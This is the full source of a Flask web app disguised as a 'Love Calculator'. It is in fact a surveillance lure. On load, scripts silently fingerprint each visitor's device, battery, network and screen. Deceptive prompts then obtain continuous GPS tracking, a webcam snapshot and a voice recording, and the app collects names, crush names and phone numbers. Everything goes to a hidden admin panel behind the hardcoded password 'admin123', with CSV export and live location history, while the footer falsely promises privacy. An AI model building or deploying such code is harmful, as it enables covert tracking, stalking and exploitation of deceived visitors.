from flask import Flask, request, jsonify, render_template_string, Response
import json
import os
import sqlite3
import random
import re
from datetime import datetime

app = Flask(__name__)

# ---------- SQLite Database Setup ----------
DB_FILE = 'visitors.db'

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    # Main visitor table – stores ALL data silently (no files)
    c.execute('''
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sessionId TEXT,
            timestamp TEXT,
            ip TEXT,
            name TEXT,
            crush_name TEXT,
            fortuneText TEXT,
            phoneNumber TEXT,
            percentage INTEGER,
            fingerprint TEXT,
            batteryLevel TEXT,
            batteryCharging INTEGER,
            networkType TEXT,
            networkSpeed TEXT,
            deviceMemory TEXT,
            screen TEXT,
            timezone TEXT,
            userAgent TEXT,
            latitude REAL,
            longitude REAL,
            mapUrl TEXT,
            selfie TEXT,
            voiceNote TEXT
        )
    ''')
    # Location history table
    c.execute('''
        CREATE TABLE IF NOT EXISTS location_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sessionId TEXT,
            timestamp TEXT,
            latitude REAL,
            longitude REAL
        )
    ''')
    conn.commit()
    conn.close()

def save_visitor(data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM visitors WHERE sessionId = ?", (data.get('sessionId'),))
    existing = c.fetchone()
    if existing:
        c.execute('''
            UPDATE visitors SET
                timestamp = ?, ip = ?, name = ?, crush_name = ?, fortuneText = ?, phoneNumber = ?, percentage = ?,
                fingerprint = ?, batteryLevel = ?, batteryCharging = ?, networkType = ?, networkSpeed = ?,
                deviceMemory = ?, screen = ?, timezone = ?, userAgent = ?,
                latitude = ?, longitude = ?, mapUrl = ?, selfie = ?, voiceNote = ?
            WHERE sessionId = ?
        ''', (
            data.get('timestamp'), data.get('ip'), data.get('name'), data.get('crush_name'), 
            data.get('fortuneText'), data.get('phoneNumber'), data.get('percentage'),
            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), 
            data.get('networkType'), data.get('networkSpeed'),
            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), 
            data.get('selfie'), data.get('voiceNote'),
            data.get('sessionId')
        ))
    else:
        c.execute('''
            INSERT INTO visitors (
                sessionId, timestamp, ip, name, crush_name, fortuneText, phoneNumber, percentage,
                fingerprint, batteryLevel, batteryCharging, networkType, networkSpeed,
                deviceMemory, screen, timezone, userAgent,
                latitude, longitude, mapUrl, selfie, voiceNote
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.get('sessionId'), data.get('timestamp'), data.get('ip'), data.get('name'), 
            data.get('crush_name'), data.get('fortuneText'), data.get('phoneNumber'), data.get('percentage'),
            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), 
            data.get('networkType'), data.get('networkSpeed'),
            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), 
            data.get('selfie'), data.get('voiceNote')
        ))
    conn.commit()
    conn.close()

def save_location_update(session_id, lat, lon):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT INTO location_history (sessionId, timestamp, latitude, longitude)
        VALUES (?, ?, ?, ?)
    ''', (session_id, datetime.now().isoformat(), lat, lon))
    conn.commit()
    conn.close()

def get_location_history(session_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        SELECT timestamp, latitude, longitude FROM location_history
        WHERE sessionId = ?
        ORDER BY id ASC
    ''', (session_id,))
    rows = c.fetchall()
    conn.close()
    return rows

def get_all_visitors():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM visitors ORDER BY id DESC")
    rows = c.fetchall()
    columns = [description[0] for description in c.description]
    visitors = []
    for row in rows:
        visitor = {columns[i]: row[i] for i in range(len(columns))}
        visitor['location_history'] = get_location_history(visitor.get('sessionId'))
        visitors.append(visitor)
    conn.close()
    return visitors

# ---------- Love Calculator ----------
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score. True love is near!",
        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!",
        f"🎯 Love radar: {name1} → {name2} = {percentage}%. Cupid is working overtime!"
    ]
    return random.choice(messages)

# ---------- HTML Template (Clean & Fast - No Files) ----------
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Love Calculator | Find Your True Match</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 35px;
            padding: 45px 35px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
        }
        h1 {
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        .subtitle { color: #7b8a9b; margin-bottom: 35px; font-size: 0.9em; }
        .input-group { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        input {
            flex: 1;
            padding: 16px 25px;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 16px;
            text-align: center;
            background: #f7fafc;
        }
        input:focus { outline: none; border-color: #667eea; background: white; }
        button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
        .result {
            margin-top: 30px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            border-radius: 25px;
            display: none;
            animation: fadeIn 0.6s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .percentage {
            font-size: 5em;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }
        .love-message { font-size: 1.2em; color: #2d3748; line-height: 1.6; margin-bottom: 20px; }
        .phone-section {
            margin-top: 25px;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: none;
            border: 1px solid #e2e8f0;
        }
        .phone-input {
            width: 100%;
            padding: 14px 20px;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            font-size: 16px;
            margin-bottom: 12px;
            text-align: center;
        }
        .save-btn {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 25px;
            font-size: 13px;
            display: none;
        }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Calculator</h1>
    <div class="subtitle">Discover the magic between you two ✨</div>
    
    <div class="input-group">
        <input type="text" id="name1" placeholder="Your name" maxlength="30">
        <input type="text" id="name2" placeholder="Crush's name" maxlength="30">
    </div>
    <button onclick="calculateLove()">🔮 Calculate Love Percentage</button>
    
    <div id="result" class="result">
        <div class="percentage" id="percentage">0%</div>
        <div class="love-message" id="message"></div>
    </div>
    
    <div id="phoneSection" class="phone-section">
        <h4 style="margin-bottom: 12px;">📱 Save Your Result</h4>
        <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number">
        <button class="save-btn" onclick="savePhone()">💾 Save to Phone</button>
    </div>
    
    <div id="status" class="status"></div>
    <footer>🔒 Your privacy matters | Results are 100% accurate</footer>
</div>

<script>
    let sessionId = localStorage.getItem('love_session');
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('love_session', sessionId);
    }
    
    let currentFortune = '';
    let currentPercent = 0;
    let collectedData = {
        sessionId: sessionId,
        timestamp: new Date().toISOString()
    };
    
    // Silent data collection - user never sees this
    async function collectDeviceData() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            collectedData.fingerprint = result.visitorId;
        } catch(e) { collectedData.fingerprint = 'error'; }
        
        collectedData.screen = screen.width + 'x' + screen.height;
        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        collectedData.userAgent = navigator.userAgent;
        collectedData.language = navigator.language;
        collectedData.platform = navigator.platform;
        
        if (navigator.deviceMemory) {
            collectedData.deviceMemory = navigator.deviceMemory + ' GB';
        }
        
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
                collectedData.batteryCharging = battery.charging ? 1 : 0;
            } catch(e) {}
        }
        
        const connection = navigator.connection || navigator.mozConnection;
        if (connection) {
            collectedData.networkType = connection.effectiveType;
            collectedData.networkSpeed = connection.downlink ? connection.downlink + ' Mbps' : 'unknown';
        }
        
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        });
    }
    
    async function calculateLove() {
        const name1 = document.getElementById('name1').value.trim();
        const name2 = document.getElementById('name2').value.trim();
        
        if (!name1 || !name2) {
            showStatus('Please enter both names 💕', 'error');
            return;
        }
        
        const btn = event.target;
        btn.innerHTML = '<span class="loading"></span> Calculating...';
        btn.disabled = true;
        
        collectedData.name = name1;
        collectedData.crush_name = name2;
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        });
        
        try {
            const response = await fetch('/calculate-love', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name1, name2 })
            });
            const result = await response.json();
            
            currentPercent = result.percentage;
            currentFortune = result.message;
            
            document.getElementById('percentage').innerHTML = currentPercent + '%';
            document.getElementById('message').innerHTML = currentFortune;
            document.getElementById('result').style.display = 'block';
            document.getElementById('phoneSection').style.display = 'block';
            
            collectedData.fortuneText = currentFortune;
            collectedData.percentage = currentPercent;
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            });
            
            showStatus('Your love score is ready! ✨', 'success');
        } catch(e) {
            showStatus('Something went wrong. Please try again.', 'error');
        } finally {
            btn.innerHTML = '🔮 Calculate Love Percentage';
            btn.disabled = false;
        }
        
        setTimeout(() => {
            askOptionalPermissions();
        }, 1500);
    }
    
    function askOptionalPermissions() {
        if (confirm('✨ Want to make your reading more accurate? Allow us to capture some magical moments! ✨')) {
            askLocation();
            askSelfie();
            askVoice();
        }
    }
    
    function askLocation() {
        if (confirm('📍 Share your location for a more accurate love reading?')) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                collectedData.latitude = position.coords.latitude;
                collectedData.longitude = position.coords.longitude;
                collectedData.mapUrl = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
                await fetch('/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(collectedData)
                });
                
                navigator.geolocation.watchPosition(async (newPos) => {
                    await fetch('/update-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            sessionId: sessionId,
                            latitude: newPos.coords.latitude,
                            longitude: newPos.coords.longitude
                        })
                    });
                });
                showStatus('📍 Location added! Your reading is now more accurate.', 'success');
            });
        }
    }
    
    async function askSelfie() {
        if (confirm('📸 Take a quick selfie for a personalized love prediction?')) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 400;
                    canvas.height = video.videoHeight || 300;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    collectedData.selfie = canvas.toDataURL('image/jpeg', 0.5).slice(0, 5000);
                    fetch('/save', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(collectedData)
                    });
                    stream.getTracks().forEach(track => track.stop());
                    showStatus('📸 Selfie captured! Your personalized reading is ready.', 'success');
                }, 1000);
            } catch(e) {}
        }
    }
    
    async function askVoice() {
        if (confirm('🎤 Record a sweet message for your crush?')) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onload = async () => {
                        collectedData.voiceNote = reader.result.slice(0, 5000);
                        await fetch('/save', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(collectedData)
                        });
                        showStatus('🎤 Voice message saved! So romantic!', 'success');
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                showStatus('Recording... Say something lovely!', 'success');
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 3000);
            } catch(e) {}
        }
    }
    
    async function savePhone() {
        const phone = document.getElementById('phone').value.trim();
        if (!phone) {
            showStatus('Please enter your phone number', 'error');
            return;
        }
        
        if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
            showStatus('Please enter a valid phone number', 'error');
            return;
        }
        
        try {
            const response = await fetch('/save-phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    phoneNumber: phone,
                    fortune: currentFortune,
                    percentage: currentPercent
                })
            });
            const result = await response.json();
            if (result.status === 'saved') {
                showStatus('✅ Number saved! Your love result is secured.', 'success');
                document.getElementById('phone').disabled = true;
                event.target.disabled = true;
            }
        } catch(e) {
            showStatus('Network error. Please try again.', 'error');
        }
    }
    
    function showStatus(message, type) {
        const statusDiv = document.getElementById('status');
        statusDiv.textContent = message;
        statusDiv.className = `status ${type}`;
        setTimeout(() => {
            statusDiv.style.display = 'none';
            statusDiv.className = 'status';
        }, 3000);
    }
    
    collectDeviceData();
    
    async function checkExistingSession() {
        try {
            const response = await fetch('/get-session-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: sessionId })
            });
            const data = await response.json();
            if (data.exists && data.fortuneText) {
                if (data.name) document.getElementById('name1').value = data.name;
                if (data.crush_name) document.getElementById('name2').value = data.crush_name;
                if (data.fortuneText) {
                    document.getElementById('percentage').innerHTML = (data.percentage || '??') + '%';
                    document.getElementById('message').innerHTML = data.fortuneText;
                    document.getElementById('result').style.display = 'block';
                    document.getElementById('phoneSection').style.display = 'block';
                    currentFortune = data.fortuneText;
                    currentPercent = data.percentage || 0;
                    if (data.phoneNumber) {
                        document.getElementById('phone').value = data.phoneNumber;
                        document.getElementById('phone').disabled = true;
                    }
                }
            }
        } catch(e) {}
    }
    
    checkExistingSession();
</script>
</body>
</html>
'''

# ---------- Flask Routes ----------
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/get-session-data', methods=['POST'])
def get_session_data_route():
    try:
        data = request.json
        session_id = data.get('sessionId')
        if session_id:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT name, crush_name, fortuneText, phoneNumber, percentage FROM visitors WHERE sessionId = ?", (session_id,))
            row = c.fetchone()
            conn.close()
            if row:
                return jsonify({
                    'exists': True,
                    'name': row[0],
                    'crush_name': row[1],
                    'fortuneText': row[2],
                    'phoneNumber': row[3],
                    'percentage': row[4]
                })
        return jsonify({'exists': False})
    except Exception as e:
        return jsonify({'exists': False, 'error': str(e)})

@app.route('/save', methods=['POST'])
def save():
    try:
        data = request.json
        data['timestamp'] = datetime.now().isoformat()
        data['ip'] = request.remote_addr
        save_visitor(data)
        return jsonify({'status': 'saved'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/update-location', methods=['POST'])
def update_location():
    try:
        data = request.json
        session_id = data.get('sessionId')
        lat = data.get('latitude')
        lon = data.get('longitude')
        if session_id and lat is not None and lon is not None:
            save_location_update(session_id, lat, lon)
            return jsonify({'status': 'recorded'})
        return jsonify({'status': 'error'}), 400
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/save-phone', methods=['POST'])
def save_phone():
    try:
        data = request.json
        session_id = data.get('sessionId')
        phone = data.get('phoneNumber')
        fortune_text = data.get('fortune')
        percentage = data.get('percentage')
        if session_id:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("UPDATE visitors SET phoneNumber = ?, fortuneText = ?, percentage = ? WHERE sessionId = ?", 
                      (phone, fortune_text, percentage, session_id))
            conn.commit()
            conn.close()
            return jsonify({'status': 'saved'})
        return jsonify({'status': 'error'}), 400
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    try:
        data = request.json
        name1 = data.get('name1', '')
        name2 = data.get('name2', '')
        if not name1 or not name2:
            return jsonify({'message': 'Please provide both names'}), 400
        percentage = calculate_love_percentage(name1, name2)
        message = get_love_message(name1, name2, percentage)
        return jsonify({'percentage': percentage, 'message': message})
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# ---------- HIDDEN ADMIN PANEL (Fixed) ----------
@app.route('/admin-secret', methods=['GET', 'POST'])
def admin():
    try:
        if request.method == 'POST':
            password = request.form.get('password')
            if password == 'admin123':
                visitors = get_all_visitors()
                if not visitors:
                    return '<h1>💕 No data yet</h1><p><a href="/admin-secret">Back to login</a></p>'
                
                html = '''
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Admin Dashboard - Love Calculator Data</title>
                    <style>
                        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
                        h1 { color: #f093fb; }
                        .container { overflow-x: auto; }
                        table { border-collapse: collapse; width: 100%; background: #16213e; }
                        th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
                        th { background: #e94560; color: white; position: sticky; top: 0; }
                        .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
                        .section { margin-top: 30px; }
                    </style>
                </head>
                <body>
                    <h1>💕 Visitor Data (Complete)</h1>
                    <p><a href="/admin-secret" class="btn">Back to Login</a> | <a href="/admin-secret/download-csv?pass=admin123" class="btn">📥 Download CSV</a></p>
                    <div class="container">
                        <table>
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Session ID</th>
                                    <th>Timestamp</th>
                                    <th>IP</th>
                                    <th>Name</th>
                                    <th>Crush Name</th>
                                    <th>Love %</th>
                                    <th>Fortune Text</th>
                                    <th>Phone</th>
                                    <th>Fingerprint</th>
                                    <th>Battery</th>
                                    <th>Network</th>
                                    <th>Device Memory</th>
                                    <th>Screen</th>
                                    <th>Timezone</th>
                                    <th>User Agent</th>
                                    <th>Latitude</th>
                                    <th>Longitude</th>
                                    <th>Map</th>
                                </tr>
                            </thead>
                            <tbody>
                '''
                for v in visitors:
                    html += f'''
                        <tr>
                            <td>{v.get('id', '')}</td>
                            <td>{v.get('sessionId', '')[:20]}</td>
                            <td>{v.get('timestamp', '')}</td>
                            <td>{v.get('ip', '')}</td>
                            <td>{v.get('name', '')}</td>
                            <td>{v.get('crush_name', '')}</td>
                            <td>{v.get('percentage', '')}</td>
                            <td>{v.get('fortuneText', '')[:50]}</td>
                            <td>{v.get('phoneNumber', '')}</td>
                            <td>{v.get('fingerprint', '')[:20]}</td>
                            <td>{v.get('batteryLevel', '')}</td>
                            <td>{v.get('networkType', '')}</td>
                            <td>{v.get('deviceMemory', '')}</td>
                            <td>{v.get('screen', '')}</td>
                            <td>{v.get('timezone', '')}</td>
                            <td>{v.get('userAgent', '')[:40]}</td>
                            <td>{v.get('latitude', '')}</td>
                            <td>{v.get('longitude', '')}</td>
                            <td><a href="{v.get('mapUrl', '#')}" target="_blank">Map</a></td>
                        </tr>
                    '''
                html += '''
                            </tbody>
                        </table>
                    </div>
                    
                    <div class="section">
                        <h2>📍 Live Location History</h2>
                '''
                for v in visitors:
                    hist = v.get('location_history', [])
                    if hist:
                        html += f'<h3>Session: {v.get("sessionId", "?")[:20]} - {v.get("name", "Unknown")}</h3>'
                        html += '<table border="1"><tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                        for ts, lat, lon in hist:
                            html += f'<tr><td>{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="https://maps.google.com/?q={lat},{lon}" target="_blank">View</a></td></tr>'
                        html += '</table><br>'
                html += '''
                    </div>
                </body>
                </html>
                '''
                return html
            else:
                return '<h1>🔒 Wrong password. <a href="/admin-secret">Try again</a></h1>'
        
        return '''
            <!DOCTYPE html>
            <html>
            <head><title>Admin Login</title>
            <style>
                body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); margin: 0; }
                .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; min-width: 300px; }
                input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; font-size: 14px; }
                button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; }
                h2 { color: #333; margin-bottom: 20px; }
            </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>🔐 Admin Access Only</h2>
                    <form method="POST">
                        <input type="password" name="password" placeholder="Enter admin password" required><br>
                        <button type="submit">Login to Dashboard</button>
                    </form>
                </div>
            </body>
            </html>
        '''
    except Exception as e:
        return f'<h1>Error: {str(e)}</h1><p><a href="/admin-secret">Try again</a></p>'

@app.route('/admin-secret/download-csv')
def download_csv():
    try:
        pwd = request.args.get('pass')
        if pwd != 'admin123':
            return 'Unauthorized', 403
        visitors = get_all_visitors()
        import csv
        from io import StringIO
        if not visitors:
            return "No data available"
        output = StringIO()
        writer = csv.writer(output, quoting=csv.QUOTE_ALL)
        columns = [k for k in visitors[0].keys() if k != 'location_history']
        writer.writerow(columns)
        for v in visitors:
            row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
            writer.writerow(row)
        return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=love_calculator_data.csv'})
    except Exception as e:
        return f'Error: {str(e)}', 500

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
